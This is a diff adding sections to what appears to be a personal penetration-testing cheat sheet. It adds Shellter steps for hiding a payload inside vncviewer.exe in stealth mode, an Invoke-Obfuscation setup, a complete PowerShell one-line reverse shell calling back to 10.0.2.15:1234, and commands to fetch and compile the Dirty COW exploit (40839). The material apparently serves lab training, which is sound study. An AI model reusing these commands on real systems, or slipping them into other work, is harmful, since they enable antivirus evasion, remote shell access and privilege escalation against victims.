@@ -62,7 +62,10 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 
 # 2 Exploitation
 - [ARP Poisoning](#ARP-Poisoning)
+- [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
 - [BadBlue httpd 2.7](#BadBlue-httpd-27)
+- [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
+- [Linux Compilation](#Linux-Compilation)
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
@@ -78,9 +81,48 @@ arpspoof -i <interface> -t <ip1> -r <ip2>
 sudo wireshark -i <interface> -k
 ```
 
+## AV Evasion and Obfuscation
+```
+sudo apt install shellter -y
+
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install wine32 -y
+```
+```
+mkdir ~/Desktop/AVBypass
+cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe
+
+cd /usr/share/windows-resources/shellter
+sudo wine shellter.exe
+```
+- Backup of PE at `/usr/share/windows-resources/shellter/Shellter_Backups`.
+- Select Stealth mode - `vncviewer.exe` will function normally.
+
+```
+cd ~/Desktop/AVBypass
+git clone https://github.com/danielbohannon/Invoke-Obfuscation
+
+sudo apt install powershell -y
+```
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+- Remove `powershell -nop -c` and double-quotes `"` and save as `shell.ps1`.
+
 ## BadBlue httpd 2.7
 ```
 use exploit/windows/http/badblue_passthru
+```
+
+## Exploit Database Binary Exploits
+- https://gitlab.com/exploit-database/exploitdb-bin-sploits
+
+## Linux Compilation
+```
+searchsploit -m 40839
+
+gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
 ## Rejetto HttpFileServer 2.3
